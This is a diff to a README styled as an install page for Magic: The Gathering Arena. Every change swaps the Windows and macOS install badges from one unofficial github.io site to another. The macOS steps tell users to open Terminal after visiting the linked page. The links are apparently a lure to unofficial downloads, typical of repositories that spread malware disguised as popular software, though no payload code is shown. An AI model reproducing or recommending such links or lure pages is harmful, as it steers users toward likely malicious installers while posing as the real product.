@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Magic: The Gathering Arena](https://img.shields.io/badge/⬇_Install_Magic+The+Gathering+Arena-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Magic: The Gathering Arena](https://img.shields.io/badge/⬇_Install_Magic+The+Gathering+Arena-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -61,9 +61,9 @@ Magic: The Gathering Arena is the premier digital client for playing Magic: The 
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Magic: The Gathering Arena is the premier digital client for playing Magic: The 
 
 <div align="center">
 
-[![⬇ Install Magic: The Gathering Arena](https://img.shields.io/badge/⬇_Install_Magic+The+Gathering+Arena-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Magic: The Gathering Arena](https://img.shields.io/badge/⬇_Install_Magic+The+Gathering+Arena-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Magic: The Gathering Arena is the premier digital client for playing Magic: The 
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ Magic: The Gathering Arena is the premier digital client for playing Magic: The 
 
 <div align="center">
 
-[![⬇ Install Magic: The Gathering Arena](https://img.shields.io/badge/⬇_Install_Magic+The+Gathering+Arena-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Magic: The Gathering Arena](https://img.shields.io/badge/⬇_Install_Magic+The+Gathering+Arena-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
